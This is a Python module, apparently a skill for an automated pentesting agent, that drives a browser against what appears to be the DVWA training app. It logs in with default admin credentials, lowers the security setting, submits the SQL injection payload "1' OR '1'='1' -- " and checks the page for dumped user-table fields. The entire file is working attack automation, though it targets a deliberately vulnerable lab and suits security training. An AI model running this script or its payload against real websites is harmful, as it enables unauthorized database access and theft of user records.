# agent/src/skills/sqli_low.py

from ..tools.browser import Browser
from pathlib import Path

def run(base_url: str, payload: str = "1' OR '1'='1' -- ") -> dict:
    with Browser(base_url) as b:
        # login
        b.goto("/login.php")
        b.page.wait_for_selector('input[name="username"]', timeout=15000)
        b.fill('input[name="username"]', "admin")
        b.fill('input[name="password"]', "password")
        b.click('input[type="submit"]')
        b.page.wait_for_load_state("domcontentloaded")

        # security low
        try:
            b.goto("/security.php")
            b.page.wait_for_selector('select[name="security"]', timeout=5000)
            b.page.select_option('select[name="security"]', 'low')
            b.click('input[type="submit"]')
            b.page.wait_for_load_state("domcontentloaded")
        except Exception:
            pass

        # ir para SQLi Low
        b.goto("/vulnerabilities/sqli/")
        b.page.wait_for_selector('input[name="id"]', timeout=15000)

        # enviar payload
        b.fill('input[name="id"]', payload)
        b.click('input[type="submit"]')
        b.page.wait_for_timeout(1200)

        # salvar screenshot
        agent_dir = Path(__file__).resolve().parents[2]
        screens_dir = agent_dir.parent / "screens"
        screens_dir.mkdir(parents=True, exist_ok=True)
        screenshot_path = screens_dir / "sqli_low.png"
        b.page.screenshot(path=str(screenshot_path), full_page=True)

        # analisar sucesso
        html = b.content()
        user_table_markers = ["First name", "Surname", "User ID", "Username"]
        found = any(m in html for m in user_table_markers)

        return {
            "ok": found,
            "vector": "SQLi (Low)",
            "payload": payload,
            "reason": "User table markers present" if found else "payload did not dump table",
            "evidence_excerpt": html[:1200],
            "screenshot": str(screenshot_path)
        }
